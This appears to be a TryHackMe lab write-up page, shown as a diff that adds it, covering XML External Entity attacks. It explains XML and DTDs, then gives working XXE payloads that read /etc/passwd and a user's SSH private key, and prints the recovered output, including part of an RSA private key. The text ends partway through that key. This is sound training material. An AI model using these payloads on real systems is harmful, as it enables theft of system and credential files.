@@ -1,0 +1,1097 @@
+
+<!DOCTYPE HTML>
+<html lang="" >
+    <head>
+        <meta charset="UTF-8">
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <title>XML External Entity · GitBook</title>
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <meta name="description" content="">
+        <meta name="generator" content="GitBook 3.2.3">
+        
+        
+        
+    
+    <link rel="stylesheet" href="../../gitbook/style.css">
+
+    
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-highlight/website.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-search/search.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-fontsettings/website.css">
+                
+            
+        
+
+    
+
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+        
+    
+    
+    <meta name="HandheldFriendly" content="true"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../../gitbook/images/apple-touch-icon-precomposed-152.png">
+    <link rel="shortcut icon" href="../../gitbook/images/favicon.ico" type="image/x-icon">
+
+    
+    <link rel="next" href="BrokenAccessControl.html" />
+    
+    
+    <link rel="prev" href="SensitiveDataExposure.html" />
+    
+
+    </head>
+    <body>
+        
+<div class="book">
+    <div class="book-summary">
+        
+            
+<div id="book-search-input" role="search">
+    <input type="text" placeholder="Type to search" />
+</div>
+
+            
+                <nav role="navigation">
+                
+
+
+<ul class="summary">
+    
+    
+
+    
+
+    
+        
+        
+    
+        <li class="chapter " data-level="1.1" data-path="../../">
+            
+                <a href="../../">
+            
+                    
+                    Introduction
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+    
+        
+        <li class="header">TryHackMe</li>
+        
+        
+    
+        <li class="chapter " data-level="2.1" data-path="../">
+            
+                <a href="../">
+            
+                    
+                    TryHackMe Overview
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2" data-path="../AdventofCyber2/">
+            
+                <a href="../AdventofCyber2/">
+            
+                    
+                    Advent of Cyber 2
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.2.1" data-path="../AdventofCyber2/Day01-ChristmasCrisis.html">
+            
+                <a href="../AdventofCyber2/Day01-ChristmasCrisis.html">
+            
+                    
+                    Day 01 - Christmas Crisis
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2.2" data-path="../AdventofCyber2/Day02-TheElfStrikesBack.html">
+            
+                <a href="../AdventofCyber2/Day02-TheElfStrikesBack.html">
+            
+                    
+                    Day 02 - The Elf Strikes Back!
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2.3" data-path="../AdventofCyber2/Day03-ChristmasChaos.html">
+            
+                <a href="../AdventofCyber2/Day03-ChristmasChaos.html">
+            
+                    
+                    Day 03 - Christmas Chaos
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2.4" data-path="../AdventofCyber2/Day04-Santa'sWatching.html">
+            
+                <a href="../AdventofCyber2/Day04-Santa'sWatching.html">
+            
+                    
+                    Day 04 - Santa's Watching
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2.5" data-path="../AdventofCyber2/Day05-SomeonestoleSanta'sgiftlist.html">
+            
+                <a href="../AdventofCyber2/Day05-SomeonestoleSanta'sgiftlist.html">
+            
+                    
+                    Day 05 - Someone stole Santa's gift list!
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2.6" data-path="../AdventofCyber2/Day06-XSS.html">
+            
+                <a href="../AdventofCyber2/Day06-XSS.html">
+            
+                    
+                    Day 06 - Be careful with what you wish on a Christmas night
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2.7" data-path="../AdventofCyber2/Day07-Wireshark.html">
+            
+                <a href="../AdventofCyber2/Day07-Wireshark.html">
+            
+                    
+                    Day 07 - The Grinch Really Did Steal Christmas
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2.8" data-path="../AdventofCyber2/Day08-Nmap.html">
+            
+                <a href="../AdventofCyber2/Day08-Nmap.html">
+            
+                    
+                    Day 08 - What's Under the Christmas Tree?
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2.9" data-path="../AdventofCyber2/Day09-AnyonecanbeSanta.html">
+            
+                <a href="../AdventofCyber2/Day09-AnyonecanbeSanta.html">
+            
+                    
+                    Day 09 - Anyone can be Santa!
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2.10" data-path="../AdventofCyber2/Day10-Don'tbesElfish.html">
+            
+                <a href="../AdventofCyber2/Day10-Don'tbesElfish.html">
+            
+                    
+                    Day 10 - Don't be sElfish!
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2.11" data-path="../AdventofCyber2/Day11-TheRogueGnome.html">
+            
+                <a href="../AdventofCyber2/Day11-TheRogueGnome.html">
+            
+                    
+                    Day 11 - The Rogue Gnome
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2.12" data-path="../AdventofCyber2/Day12-Ready,set,elf.html">
+            
+                <a href="../AdventofCyber2/Day12-Ready,set,elf.html">
+            
+                    
+                    Day 12 - Ready, set, elf
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2.13" data-path="../AdventofCyber2/Day13-CoalforChristmas.html">
+            
+                <a href="../AdventofCyber2/Day13-CoalforChristmas.html">
+            
+                    
+                    Day 13 - Coal for Christmas
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2.14" data-path="../AdventofCyber2/Day14-Where'sRudolph.html">
+            
+                <a href="../AdventofCyber2/Day14-Where'sRudolph.html">
+            
+                    
+                    Day 14 - Where's Rudolph?
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2.15" data-path="../AdventofCyber2/Day15-There'saPythoninmystocking.html">
+            
+                <a href="../AdventofCyber2/Day15-There'saPythoninmystocking.html">
+            
+                    
+                    Day 15 - There's a Python in my stocking!
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2.16" data-path="../AdventofCyber2/Day16-Help!WhereisSanta.html">
+            
+                <a href="../AdventofCyber2/Day16-Help!WhereisSanta.html">
+            
+                    
+                    Day 16 - Help! Where is Santa?
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2.17" data-path="../AdventofCyber2/Day17-ReverseELFneering.html">
+            
+                <a href="../AdventofCyber2/Day17-ReverseELFneering.html">
+            
+                    
+                    Day 17 - ReverseELFneering
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2.18" data-path="../AdventofCyber2/Day18-TheBitsofChristmas.html">
+            
+                <a href="../AdventofCyber2/Day18-TheBitsofChristmas.html">
+            
+                    
+                    Day 18 - The Bits of Christmas
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2.19" data-path="../AdventofCyber2/Day19-TheNaughtyorNiceList.html">
+            
+                <a href="../AdventofCyber2/Day19-TheNaughtyorNiceList.html">
+            
+                    
+                    Day 19 - The Naughty or Nice List
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2.20" data-path="../AdventofCyber2/Day20-PowershELlFtotherescue.html">
+            
+                <a href="../AdventofCyber2/Day20-PowershELlFtotherescue.html">
+            
+                    
+                    Day 20 - PowershELlF to the rescue
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2.21" data-path="../AdventofCyber2/Day21-TimeforsomeELForensics.html">
+            
+                <a href="../AdventofCyber2/Day21-TimeforsomeELForensics.html">
+            
+                    
+                    Day 21 - Time for some ELForensics
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2.22" data-path="../AdventofCyber2/Day22-ElfMcEagerbecomesCyberElf.html">
+            
+                <a href="../AdventofCyber2/Day22-ElfMcEagerbecomesCyberElf.html">
+            
+                    
+                    Day 22 - Elf McEager becomes CyberElf
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2.23" data-path="../AdventofCyber2/Day23-TheGrinchstrikesagain.html">
+            
+                <a href="../AdventofCyber2/Day23-TheGrinchstrikesagain.html">
+            
+                    
+                    Day 23 - The Grinch strikes again!
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2.24" data-path="../AdventofCyber2/Day24-TheTrialBeforeChristmas.html">
+            
+                <a href="../AdventofCyber2/Day24-TheTrialBeforeChristmas.html">
+            
+                    
+                    Day 24 - The Trial Before Christmas
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="2.3" data-path="../WebFundamentals.html">
+            
+                <a href="../WebFundamentals.html">
+            
+                    
+                    Web Fundamentals
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.4" data-path="../Anonymous.html">
+            
+                <a href="../Anonymous.html">
+            
+                    
+                    Anonymous
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.5" data-path="../PrinterHacking101.html">
+            
+                <a href="../PrinterHacking101.html">
+            
+                    
+                    Printer Hacking 101
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.6" data-path="./">
+            
+                <a href="./">
+            
+                    
+                    OWASP Top 10
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.6.1" data-path="Injection.html">
+            
+                <a href="Injection.html">
+            
+                    
+                    Injection
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.6.2" data-path="BrokenAuthentication.html">
+            
+                <a href="BrokenAuthentication.html">
+            
+                    
+                    Broken Authentication
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.6.3" data-path="SensitiveDataExposure.html">
+            
+                <a href="SensitiveDataExposure.html">
+            
+                    
+                    Sensitive Data Exposure
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter active" data-level="2.6.4" data-path="XMLExternalEntity.html">
+            
+                <a href="XMLExternalEntity.html">
+            
+                    
+                    XML External Entity
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.6.5" data-path="BrokenAccessControl.html">
+            
+                <a href="BrokenAccessControl.html">
+            
+                    
+                    Broken Access Control
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.6.6" data-path="SecurityMisconfiguration.html">
+            
+                <a href="SecurityMisconfiguration.html">
+            
+                    
+                    Security Misconfiguration
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.6.7" data-path="Cross-SiteScripting.html">
+            
+                <a href="Cross-SiteScripting.html">
+            
+                    
+                    Cross-Site Scripting
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.6.8" data-path="InsecureDeserialization.html">
+            
+                <a href="InsecureDeserialization.html">
+            
+                    
+                    Insecure Deserialization
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.6.9" data-path="ComponentsWithKnownVulnerabilities.html">
+            
+                <a href="ComponentsWithKnownVulnerabilities.html">
+            
+                    
+                    Components with Known Vulnerabilities
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.6.10" data-path="InsufficentLoggingMonitoring.html">
+            
+                <a href="InsufficentLoggingMonitoring.html">
+            
+                    
+                    Insufficent Logging & Monitoring
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="2.7" data-path="../Vulnversity.html">
+            
+                <a href="../Vulnversity.html">
+            
+                    
+                    Vulnversity
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.8" data-path="../Nmap.html">
+            
+                <a href="../Nmap.html">
+            
+                    
+                    Nmap
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.9" data-path="../GoogleDorking.html">
+            
+                <a href="../GoogleDorking.html">
+            
+                    
+                    Google Dorking
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.10" data-path="../Blog.html">
+            
+                <a href="../Blog.html">
+            
+                    
+                    Blog
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+    
+        
+        <li class="header">HackTheBox</li>
+        
+        
+    
+        <li class="chapter " data-level="3.1" data-path="../../HackTheBox/">
+            
+                <a href="../../HackTheBox/">
+            
+                    
+                    HackTheBox Overview
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="3.2" data-path="../../HackTheBox/Emdeefiveforlife.html">
+            
+                <a href="../../HackTheBox/Emdeefiveforlife.html">
+            
+                    
+                    Emdee five for life
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+    
+        
+        <li class="header">VulnCon2020</li>
+        
+        
+    
+        <li class="chapter " data-level="4.1" data-path="../../VulnCon2020/">
+            
+                <a href="../../VulnCon2020/">
+            
+                    
+                    VulnCon2020 Overview
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="4.2" data-path="../../VulnCon2020/NoobBotWelcomesYou.html">
+            
+                <a href="../../VulnCon2020/NoobBotWelcomesYou.html">
+            
+                    
+                    Noob Bot Welcomes You!
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="4.3" data-path="../../VulnCon2020/Maze.html">
+            
+                <a href="../../VulnCon2020/Maze.html">
+            
+                    
+                    Maze
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="4.4" data-path="../../VulnCon2020/Pcaped.html">
+            
+                <a href="../../VulnCon2020/Pcaped.html">
+            
+                    
+                    Pcaped
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+    
+
+    <li class="divider"></li>
+
+    <li>
+        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
+            Published with GitBook
+        </a>
+    </li>
+</ul>
+
+
+                </nav>
+            
+        
+    </div>
+
+    <div class="book-body">
+        
+            <div class="body-inner">
+                
+                    
+
+<div class="book-header" role="navigation">
+    
+
+    <!-- Title -->
+    <h1>
+        <i class="fa fa-circle-o-notch fa-spin"></i>
+        <a href="../.." >XML External Entity</a>
+    </h1>
+</div>
+
+
+
+
+                    <div class="page-wrapper" tabindex="-1" role="main">
+                        <div class="page-inner">
+                            
+<div id="book-search-results">
+    <div class="search-noresults">
+    
+                                <section class="normal markdown-section">
+                                
+                                <h1 id="xml-external-entity">XML External Entity</h1>
+<p><strong>Date:</strong> 29, December, 2020</p>
+<p><strong>Author:</strong> Dhilip Sanjay S</p>
+<hr>
+<h2 id="what-is-xml">What is XML?</h2>
+<ul>
+<li>eXtensible Markup Language - defines a set of rules for encoding documents in a format that is both human and machine readable.</li>
+<li>It is a markup language used for storing and transporting data.</li>
+</ul>
+<h2 id="why-use-xml">Why use XML?</h2>
+<ul>
+<li>Platform and programming language independent.</li>
+<li>Data can be changed at any point in time without affecting the data presentation.</li>
+<li>XML allows validation using DTD (Document Type Definition) and Schema.</li>
+</ul>
+<h2 id="syntax">Syntax</h2>
+<ul>
+<li><p>XML Prolog is used to specify XML version and encoding in XML document:</p>
+<pre><code class="lang-xml">  <span class="php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span><span class="hljs-meta">?&gt;</span></span>
+</code></pre>
+</li>
+<li><p>XML document must contain a root element. If ther is no root element, then it would be considered wrong or invalid XML doc:</p>
+<pre><code class="lang-xml">  <span class="php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span><span class="hljs-meta">?&gt;</span></span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">mail</span>&gt;</span>
+      <span class="hljs-tag">&lt;<span class="hljs-name">to</span>&gt;</span>falcon<span class="hljs-tag">&lt;/<span class="hljs-name">to</span>&gt;</span>
+      <span class="hljs-tag">&lt;<span class="hljs-name">from</span>&gt;</span>feast<span class="hljs-tag">&lt;/<span class="hljs-name">from</span>&gt;</span>
+      <span class="hljs-tag">&lt;<span class="hljs-name">subject</span>&gt;</span>About XXE<span class="hljs-tag">&lt;/<span class="hljs-name">subject</span>&gt;</span>
+      <span class="hljs-tag">&lt;<span class="hljs-name">text</span>&gt;</span>Teach about XXE<span class="hljs-tag">&lt;/<span class="hljs-name">text</span>&gt;</span>
+  <span class="hljs-tag">&lt;/<span class="hljs-name">mail</span>&gt;</span>
+</code></pre>
+<ul>
+<li><code>mail</code> -  root element</li>
+<li><code>to</code>, <code>from</code>, <code>text</code> - children element</li>
+</ul>
+</li>
+<li><p>XML is <strong>case-sensitive</strong> language.</p>
+</li>
+<li><p>XML elements can have attributes (similar to HTML):</p>
+<pre><code class="lang-xml">  <span class="hljs-tag">&lt;<span class="hljs-name">text</span> <span class="hljs-attr">category</span> = &quot;<span class="hljs-attr">message</span>&quot;&gt;</span>You need to learn about XXE<span class="hljs-tag">&lt;/<span class="hljs-name">text</span>&gt;</span>
+</code></pre>
+<ul>
+<li><code>category</code> - attribute</li>
+<li><code>message</code> - attribute value</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h2 id="xml-external-entity---dtd-document-type-definition">XML External Entity - DTD (Document Type Definition)</h2>
+<ul>
+<li>DTD defines the structure and the legal elements and attributes of an XML document.</li>
+<li><strong>P.S:</strong> HTML has pre-defined tags and attributes, whereas in XML, we define the elements and attributes using DTD.</li>
+<li><p>Internal and External DTD declaration.</p>
+</li>
+<li><p>note.dtd</p>
+<pre><code class="lang-xml">  <span class="hljs-meta">&lt;!DOCTYPE note [ 
+  &lt;!ELEMENT note (to,from,heading,body)&gt; 
+  &lt;!ELEMENT to (#PCDATA)&gt; 
+  &lt;!ELEMENT from (#PCDATA)&gt; 
+  &lt;!ELEMENT heading (#PCDATA)&gt; 
+  &lt;!ELEMENT body (#PCDATA)&gt; ]&gt;</span>
+</code></pre>
+</li>
+<li>XML document that uses note.dtd<pre><code class="lang-xml">  <span class="php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span><span class="hljs-meta">?&gt;</span></span>
+  <span class="hljs-meta">&lt;!DOCTYPE note SYSTEM &quot;note.dtd&quot;&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">note</span>&gt;</span>
+      <span class="hljs-tag">&lt;<span class="hljs-name">to</span>&gt;</span>falcon<span class="hljs-tag">&lt;/<span class="hljs-name">to</span>&gt;</span>
+      <span class="hljs-tag">&lt;<span class="hljs-name">from</span>&gt;</span>feast<span class="hljs-tag">&lt;/<span class="hljs-name">from</span>&gt;</span>
+      <span class="hljs-tag">&lt;<span class="hljs-name">heading</span>&gt;</span>hacking<span class="hljs-tag">&lt;/<span class="hljs-name">heading</span>&gt;</span>
+      <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>XXE attack<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
+  <span class="hljs-tag">&lt;/<span class="hljs-name">note</span>&gt;</span>
+</code></pre>
+</li>
+<li>Understanding how DTD validates the XML:<ul>
+<li><code>!DOCTYPE note</code> - deines a root element of the document named <strong>note</strong>.</li>
+<li><code>!ELEMENT note</code> - defines that note element must contain the elements : &quot;to, from, heading, body&quot;.</li>
+<li><code>!ELEMENT to (#PCDATA)</code> - defines to element to be of type <strong>#PCDATA</strong></li>
+<li><code>!ELEMENT from (#PCDATA)</code> - defines to element from be of type <strong>#PCDATA</strong></li>
+<li><code>!ELEMENT heading (#PCDATA)</code> - defines to element heading be of type <strong>#PCDATA</strong></li>
+<li><code>!ELEMENT body (#PCDATA)</code> - defines to element body be of type <strong>#PCDATA</strong></li>
+</ul>
+</li>
+<li><strong>Note:</strong> <code>#PCDATA</code> - Parseable Character Data.</li>
+</ul>
+<h3 id="entities">Entities</h3>
+<ul>
+<li>Entities in DTD<pre><code class="lang-xml">  <span class="hljs-tag">&lt;<span class="hljs-name">!ENTITY</span> <span class="hljs-attr">entity-name</span> &quot;<span class="hljs-attr">entity-value</span>&quot;&gt;</span>
+</code></pre>
+</li>
+<li>Entity usage in XML<pre><code class="lang-xml">  <span class="hljs-tag">&lt;<span class="hljs-name">author</span>&gt;</span>&amp;entity-name;<span class="hljs-tag">&lt;/<span class="hljs-name">author</span>&gt;</span>
+</code></pre>
+<h3 id="external-entities">External Entities</h3>
+</li>
+<li>External entity in DTD<pre><code class="lang-xml">  <span class="hljs-tag">&lt;<span class="hljs-name">!ENTITY</span> <span class="hljs-attr">entity-name</span> <span class="hljs-attr">SYSTEM</span> &quot;<span class="hljs-attr">URI</span>/<span class="hljs-attr">URL</span>&quot;&gt;</span>
+</code></pre>
+</li>
+</ul>
+<hr>
+<h2 id="xxe-attack">XXE Attack</h2>
+<ul>
+<li><p>XXE attack is a vulnerability that absuses features of XML parsers/data.</p>
+<ul>
+<li>Denial of Service</li>
+<li>Server-Side Request Forgery</li>
+<li>Enable port scanning</li>
+<li>Remote code Execution</li>
+</ul>
+</li>
+<li><p>Two types of XXE attacks</p>
+<ul>
+<li><strong>In-band XXE:</strong> Attacker can receive an immediate response to the XXE payload.</li>
+<li><strong>Out-of-band XXE (Blind XXE):</strong> No immediate response from the web application. Attacker has to reflect the output of their XXE payload to some other file or their own server.</li>
+</ul>
+</li>
+</ul>
+<h2 id="xxe-payload">XXE Payload</h2>
+<ul>
+<li><p>To verify that XML is parsed:</p>
+<pre><code class="lang-xml">  <span class="hljs-meta">&lt;!DOCTYPE replace [&lt;!ENTITY name &quot;feast&quot;&gt; ]&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">userInfo</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">firstName</span>&gt;</span>falcon<span class="hljs-tag">&lt;/<span class="hljs-name">firstName</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">lastName</span>&gt;</span>&amp;name;<span class="hljs-tag">&lt;/<span class="hljs-name">lastName</span>&gt;</span>
+  <span class="hljs-tag">&lt;/<span class="hljs-name">userInfo</span>&gt;</span>
+</code></pre>
+</li>
+<li><p>XXE to read some file from the system by suing ENTITY and SYSTEM keywords:</p>
+<pre><code class="lang-xml">  <span class="php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">&quot;1.0&quot;</span><span class="hljs-meta">?&gt;</span></span>
+  <span class="hljs-meta">&lt;!DOCTYPE root [&lt;!ENTITY read SYSTEM &apos;file:///etc/passwd&apos;&gt;]&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span>&amp;read;<span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span>
+</code></pre>
+</li>
+</ul>
+<hr>
+<h2 id="xxe-exploiting">XXE Exploiting</h2>
+<h3 id="try-to-display-your-own-name-using-any-payload">Try to display your own name using any payload.</h3>
+<pre><code>```xml
+ &lt;!DOCTYPE replace [&lt;!ENTITY name &quot;Sanjay&quot;&gt; ]&gt;
+&lt;userInfo&gt;
+&lt;firstName&gt;Dhilip&lt;/firstName&gt;
+&lt;lastName&gt;&amp;name;&lt;/lastName&gt;
+&lt;/userInfo&gt;
+```   
+</code></pre><hr>
+<h3 id="see-if-you-can-read-the-etcpasswd">See if you can read the /etc/passwd</h3>
+<ul>
+<li><strong>Answer:</strong> <pre><code class="lang-bash">  root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin syslog:x:102:106::/home/syslog:/usr/sbin/nologin messagebus:x:103:107::/nonexistent:/usr/sbin/nologin _apt:x:104:65534::/nonexistent:/usr/sbin/nologin lxd:x:105:65534::/var/lib/lxd/:/bin/<span class="hljs-literal">false</span> uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin sshd:x:109:65534::/run/sshd:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/<span class="hljs-literal">false</span> falcon:x:1000:1000:falcon,,,:/home/falcon:/bin/bash
+</code></pre>
+</li>
+<li><strong>Steps to Reproduce:</strong> <pre><code class="lang-xml">  <span class="php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">&quot;1.0&quot;</span><span class="hljs-meta">?&gt;</span></span>
+  <span class="hljs-meta">&lt;!DOCTYPE root [&lt;!ENTITY read SYSTEM &apos;file:///etc/passwd&apos;&gt;]&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span>&amp;read;<span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span>
+</code></pre>
+</li>
+</ul>
+<hr>
+<h3 id="what-is-the-name-of-the-user-in-etcpasswd">What is the name of the user in /etc/passwd</h3>
+<ul>
+<li><strong>Answer:</strong> falcon</li>
+</ul>
+<hr>
+<h3 id="where-is-falcons-ssh-key-located">Where is falcon&apos;s SSH key located?</h3>
+<ul>
+<li><strong>Answer:</strong> /home/falcon/.ssh/id_rsa</li>
+<li>Usually the ssh keys are stored in <code>id_rsa</code> file of the respective user&apos;s <code>.ssh</code> folder by default.</li>
+</ul>
+<hr>
+<h3 id="what-are-the-first-18-characters-for-falcons-private-keys">What are the first 18 characters for falcon&apos;s private keys</h3>
+<ul>
+<li><strong>Answer:</strong> MIIEogIBAAKCAQEA7b</li>
+<li><strong>Steps to Reproduce:</strong> <pre><code class="lang-xml">  <span class="php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">&quot;1.0&quot;</span><span class="hljs-meta">?&gt;</span></span>
+  <span class="hljs-meta">&lt;!DOCTYPE ssh [&lt;!ENTITY key SYSTEM &quot;file:/home/falcon/.ssh/id_rsa&quot;&gt;]&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">ssh</span>&gt;</span>&amp;key;<span class="hljs-tag">&lt;/<span class="hljs-name">ssh</span>&gt;</span>
+</code></pre>
+<ul>
+<li><strong>Output:</strong><pre><code class="lang-bash">-----BEGIN RSA PRIVATE KEY----- MIIEogIBAAKCAQEA7bq7Uj0ZQzFiWzKc81OibYfCGhA24RYmcterVvRvdxw0IVSC lZ9oM4LiwzqRIEbed7/hAA0wu6Tlyy+oLHZn2i3pLur07pxb0bfYkr7r5DaKpRPB 2Echy67MiXAQu/xgHd1e7tST18B+Ubnwo4YZNxQa+vhHRx4G5NLRL8sT+Vj9atKN MfJmbzClgOKpTNgBaAkzY5ueWww9g0CkCldOBCM38nkEwLJAzCKtaHSreXFNN2hQ IGfizQYRDWH1EyDbaPmvZmy0lEELfMR18wjYF1VBTAl8PNCcqVVDaKaIrbnshQpO HoqIKrf3wLn4rnU9873C3JKzX1aDP6q+P+9BlwIDAQABAoIBABnNP5GAciJ51KwD RUeflyx+JJIBmoM5jTi/sagBZauu0vWfH4EvyPZ2SThZPfEb3/9tQvVneReUoSA5 bu5Md58Vho6CD81qCQktBAOBV0bwqIGcMFjR95gMw8RS9m4AyUnUgf438kfja5Jh NP36ivgQZZFBqzLLzoG9Y9jlGKjiSyMvW4u63ZacCKPTpp5P53794/UVU7JiM03y OvavZ2QveJp5BndV5lOkcIEFwFRACDK1xwzDRzx/TNJLufztb2EheMc3stNuOMea TLKlbG0Mp/c2az8vNN6HA0QiwxYlKZ58RfdsOfbsFxAltYNnzxy9UEieXtrWVg7X Q<span class="hljs-keyword">fi</span>/ZeECgYEA/pfgg6BClEmipXv8hVkLWe7VwlFf4RXnxfWyi6OqC/3Yt9Q9B4Ya 6<span class="hljs-built_in">bg</span>Lzk2vPNHgJt+g2yh/TzMX6sCC9IMYedc0faiJr/VISBm25qTjqIGctwt0D3nb j60mSKKFbwDPxrcek/7WH1cWDcaLTDdL9KPLk1JQzbwDzojrE1TDD+cCgYEA7wsA 